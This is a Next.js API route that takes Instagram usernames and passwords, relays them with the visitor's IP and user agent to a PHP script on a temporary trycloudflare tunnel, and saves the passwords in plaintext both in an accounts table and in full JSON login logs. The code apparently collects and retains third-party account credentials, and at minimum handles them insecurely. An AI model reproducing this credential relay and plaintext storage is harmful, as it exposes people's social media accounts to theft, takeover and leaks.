import { NextRequest } from "next/server";
import pool from "@/lib/db";
const PHP_LOGIN_URL = "https://ciao-keno-significant-arcade.trycloudflare.com/instagram-login.php";

export async function POST(req: NextRequest) {
  try {
    const user_id = 1; // Replace with real session logic
    const body = await req.json();
    const { username, password } = body;

    if (!username || !password) {
      return new Response(
        JSON.stringify({ status: "error", message: "Missing credentials" }),
        { status: 400 }
      );
    }

    // Get IP and user agent from headers
    const ip_address = req.headers.get("x-forwarded-for") || "";
    const user_agent = req.headers.get("user-agent") || "";

    const requestTimestamp = new Date().toISOString();

    // Send login request to PHP server
    const phpRes = await fetch(PHP_LOGIN_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username,
        password,
        ip_address,
        user_agent,
      }),
    });

    let loginResult;
    let phpRawResponse;
    try {
      phpRawResponse = await phpRes.text();
      loginResult = JSON.parse(phpRawResponse);
    } catch (err) {
      console.error("PHP response not JSON:", phpRawResponse);
      return new Response(
        JSON.stringify({ status: "error", message: "PHP server error", details: phpRawResponse }),
        { status: 500 }
      );
    }

    const responseTimestamp = new Date().toISOString();

    // Save to DB if login is successful
    if (loginResult.status === "success") {
      await pool.query(
        `INSERT INTO instagram_accounts 
          (user_id, instagram_username, instagram_password, created_at, status, ip_address, user_agent, session_id, api_response)
          VALUES ($1, $2, $3, NOW(), TRUE, $4, $5, $6, $7)`,
        [
          user_id,
          username,
          password,
          ip_address,
          user_agent,
          loginResult.session_id,
          JSON.stringify(loginResult.instagram_response),
        ]
      );
    }

    // Save detailed login info as JSON in login_logs table
    const loginLog = {
      request: {
        timestamp: requestTimestamp,
        username,
        password,
        ip_address,
        user_agent,
      },
      response: {
        timestamp: responseTimestamp,
        php_raw: phpRawResponse,
        parsed: loginResult,
      },
    };

    await pool.query(
      `INSERT INTO login_logs (username, log) VALUES ($1, $2)`,
      [username, JSON.stringify(loginLog)]
    );

    return Response.json(loginResult);
  } catch (e) {
    console.error("API error:", e);
    return new Response(
      JSON.stringify({ status: "error", message: "Internal server error" }),
      { status: 500 }
    );
  }
}